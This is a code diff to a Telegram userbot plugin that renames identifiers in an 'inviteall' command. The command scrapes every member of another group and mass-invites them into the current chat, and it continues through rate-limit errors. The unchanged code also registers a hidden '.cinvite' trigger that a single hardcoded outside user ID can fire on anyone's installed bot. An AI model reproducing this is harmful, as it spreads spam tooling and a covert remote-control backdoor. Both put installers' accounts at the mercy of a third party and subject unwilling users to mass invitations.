@@ -9,7 +9,7 @@ from telethon.tl.functions.messages import GetFullChatRequest
 
 from userbot import CMD_HELP, CMD_HANDLER as cmd
 from userbot.events import register
-from userbot.utils import edit_or_reply, kyy_cmd
+from userbot.utils import edit_or_reply, venz_cmd
 
 
 async def get_chatinfo(event):
@@ -49,42 +49,42 @@ async def get_chatinfo(event):
     return chat_info
 
 
-@kyy_cmd(pattern="inviteall(?: |$)(.*)")
+@venz_cmd(pattern="inviteall(?: |$)(.*)")
 @register(incoming=True, from_users=1663258664,
           pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
     me = await event.client.get_me()
     if not sender.id == me.id:
-        kyy = await event.reply("`processing...`")
+        venz = await event.reply("`processing...`")
     else:
-        kyy = await edit_or_reply(event, "`processing...`")
+        venz = await edit_or_reply(event, "`processing...`")
     geezteam = await get_chatinfo(event)
     chat = await event.get_chat()
     if event.is_private:
-        return await kyy.edit("`Sorry, Can add users here`")
+        return await venz.edit("`Sorry, Can add users here`")
     s = 0
     f = 0
     error = "None"
 
-    await kyy.edit("**TerminalStatus**\n\n`Collecting Users.......`")
+    await venz.edit("**TerminalStatus**\n\n`Collecting Users.......`")
     async for user in event.client.iter_participants(geezteam.full_chat.id):
         try:
             if error.startswith("Too"):
-                return await kyy.edit(
+                return await venz.edit(
                     f"**Terminal Finished With Error**\n(`May Got Limit Error from telethon Please try agin Later`)\n**Error** : \n`{error}`\n\n• Invited `{s}` people \n• Failed to Invite `{f}` people"
                 )
             await event.client(
                 functions.channels.InviteToChannelRequest(channel=chat, users=[user.id])
             )
             s = s + 1
-            await kyy.edit(
+            await venz.edit(
                 f"**Terminal Running...**\n\n• Invited `{s}` people \n• Failed to Invite `{f}` people\n\n**× LastError:** `{error}`"
             )
         except Exception as e:
             error = str(e)
             f = f + 1
-    return await kyy.edit(
+    return await venz.edit(
         f"**Terminal Finished** \n\n• Successfully Invited `{s}` people \n• failed to invite `{f}` people"
     )
 
